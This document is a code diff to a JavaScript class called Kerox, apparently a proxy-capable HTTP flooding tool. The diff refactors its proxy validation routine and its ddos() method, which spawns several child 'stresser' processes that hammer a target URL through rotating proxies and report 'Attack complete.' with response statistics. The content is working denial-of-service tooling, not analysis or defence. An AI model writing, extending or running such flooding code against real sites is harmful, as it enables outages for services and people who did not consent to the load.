@@ -83,7 +83,7 @@ class Kerox extends events_1.default {
         this.stats = new Stats_1.Stats();
         this.progressBar = new ProgressBar_1.ProgressBar(26);
         this.options = {
-            updateInterval: 1000,
+            updateInterval: 100,
             refreshRate: 5,
             useProxies: false,
             validateProxies: true,
@@ -206,49 +206,47 @@ class Kerox extends events_1.default {
     /**
      * Starts a stresser to validate the proxies and keep only the working ones.
      */
-    validateProxies() {
-        return __awaiter(this, arguments, void 0, function* (timeout = 5000) {
-            return new Promise((resolve, reject) => {
-                if (!this.options.validateProxies) {
-                    this.logs._info('Skipping proxy validation.'._dim);
-                    return resolve();
-                }
-                // set status
-                this._status = [Status_1.Status.Busy, Status_2.Info.ValidatingProxies];
-                this.resetStats();
-                // validate proxies
-                let validator = this.spawn({
-                    updateInterval: this.options.updateInterval,
-                    target: 'https://example.com',
-                    useProxies: true,
-                    proxies: this.proxies,
-                    multiplier: 1,
-                    maxPending: 1,
-                    agent: undefined,
-                    dropRequests: false,
-                });
-                // listen for validation completion
-                validator === null || validator === void 0 ? void 0 : validator.on('message', (packet) => {
-                    if (packet.type === PacketType_1.PacketType.ValidationCompleted) {
-                        const validProxies = packet.data;
-                        if (validProxies && validProxies.length > 0) {
-                            this.logs._info(`Found ${validProxies.length} valid proxies`);
-                            this.proxies = validProxies;
-                            this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
-                            return resolve();
-                        }
-                        else {
-                            return this.crash('No valid proxies found.');
-                        }
-                    }
-                });
-                // start proxy validation
-                let packet = (0, Packet_1.Packet)(PacketType_1.PacketType.ValidateProxies, {
-                    proxies: this.proxies,
-                    timeout: timeout
-                });
-                validator.send(packet);
+    validateProxies(timeout = 5000) {
+        return new Promise((resolve, reject) => {
+            if (!this.options.validateProxies) {
+                this.logs._info('Skipping proxy validation.'._dim);
+                return resolve();
+            }
+            // set status
+            this._status = [Status_1.Status.Busy, Status_2.Info.ValidatingProxies];
+            this.resetStats();
+            // validate proxies
+            let validator = this.spawn({
+                updateInterval: this.options.updateInterval,
+                target: 'https://example.com',
+                useProxies: true,
+                proxies: this.proxies,
+                multiplier: 1,
+                maxPending: 1,
+                agent: undefined,
+                dropRequests: false,
             });
+            // listen for validation completion
+            validator === null || validator === void 0 ? void 0 : validator.on('message', (packet) => {
+                if (packet.type === PacketType_1.PacketType.ValidationCompleted) {
+                    const validProxies = packet.data;
+                    if (validProxies && validProxies.length > 0) {
+                        this.logs._info(`Found ${validProxies.length} valid proxies`);
+                        this.proxies = validProxies;
+                        this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
+                        return resolve();
+                    }
+                    else {
+                        return this.crash('No valid proxies found.');
+                    }
+                }
+            });
+            // start proxy validation
+            let packet = (0, Packet_1.Packet)(PacketType_1.PacketType.ValidateProxies, {
+                proxies: this.proxies,
+                timeout: timeout
+            });
+            validator.send(packet);
         });
     }
     // ========== Stressers =============================================================================
@@ -305,55 +303,58 @@ class Kerox extends events_1.default {
      * @param target The target url
      */
     ddos(options) {
-        if (this.status === Status_1.Status.Busy)
-            return this.crash(`Kerox is ${this.status}. ${this.info}`);
-        this._status = [Status_1.Status.Busy, Status_2.Info.Stressing];
-        this.stopStressers();
-        this.ddosOptions = options;
-        const onSpawned = () => {
-            this.resetStats();
-            this.stressers.forEach(stresser => stresser.send((0, Packet_1.Packet)(PacketType_1.PacketType.Stress, options.duration)));
-        };
-        const onCompleted = () => {
-            var _a;
-            this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
-            this.logs._info('Attack complete.'._GreenApple._bold);
-            this.logs._stats(this.statsPanel(this.stats) + '\n');
-            if ((_a = this.ddosOptions) === null || _a === void 0 ? void 0 : _a.display.httpCodes)
-                this.logs._stats(this.httpCodesPanel(this.stats.codes) + '\n');
+        return new Promise((resolve, reject) => {
+            if (this.status === Status_1.Status.Busy)
+                return this.crash(`Kerox is ${this.status}. ${this.info}`);
+            this._status = [Status_1.Status.Busy, Status_2.Info.Stressing];
             this.stopStressers();
-            this.stats.disable();
-        };
-        // spawn stressers
-        let spawned = 0;
-        let completed = 0;
-        for (let i = 0; i < options.childProcesses; i++) {
-            const stresser = this.spawn({
-                updateInterval: this.options.updateInterval,
-                target: options.target,
-                useProxies: this.options.useProxies,
-                proxies: this.proxies,
-                multiplier: options.multiplier,
-                maxPending: Math.floor(options.maxPending / options.childProcesses),
-                agent: options.agent,
-                dropRequests: options.dropRequests,
-            });
-            // wait for completed
-            stresser.on('message', (packet) => {
-                switch (packet.type) {
-                    case PacketType_1.PacketType.Spawned:
-                        spawned++;
-                        if (spawned === options.childProcesses)
-                            onSpawned();
-                        break;
-                    case PacketType_1.PacketType.Done:
-                        completed++;
-                        if (completed === options.childProcesses)
-                            onCompleted();
-                        break;
-                }
-            });
-        }
+            this.ddosOptions = options;
+            const onAllSpawned = () => {
+                this.resetStats();
+                this.stressers.forEach(stresser => stresser.send((0, Packet_1.Packet)(PacketType_1.PacketType.Stress, options.duration)));
+            };
+            const onAllCompleted = () => {
+                var _a;
+                this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
+                this.logs._info('Attack complete.'._GreenApple._bold);
+                this.logs._stats(this.statsPanel(this.stats) + '\n');
+                if ((_a = this.ddosOptions) === null || _a === void 0 ? void 0 : _a.display.httpCodes)
+                    this.logs._stats(this.httpCodesPanel(this.stats.codes) + '\n');
+                this.stopStressers();
+                this.stats.disable();
+                resolve();
+            };
+            // spawn stressers
+            let spawned = 0;
+            let completed = 0;
+            for (let i = 0; i < options.childProcesses; i++) {
+                const stresser = this.spawn({
+                    updateInterval: this.options.updateInterval,
+                    target: options.target,
+                    useProxies: this.options.useProxies,
+                    proxies: this.proxies,
+                    multiplier: options.multiplier,
+                    maxPending: Math.floor(options.maxPending / options.childProcesses),
+                    agent: options.agent,
+                    dropRequests: options.dropRequests,
+                });
+                // wait for completed
+                stresser.on('message', (packet) => {
+                    switch (packet.type) {
+                        case PacketType_1.PacketType.Spawned:
+                            spawned++;
+                            if (spawned === options.childProcesses)
+                                onAllSpawned();
+                            break;
+                        case PacketType_1.PacketType.Done:
+                            completed++;
+                            if (completed === options.childProcesses)
+                                onAllCompleted();
+                            break;
+                    }
+                });
+            }
+        });
     }
 }
 exports.Kerox = Kerox;
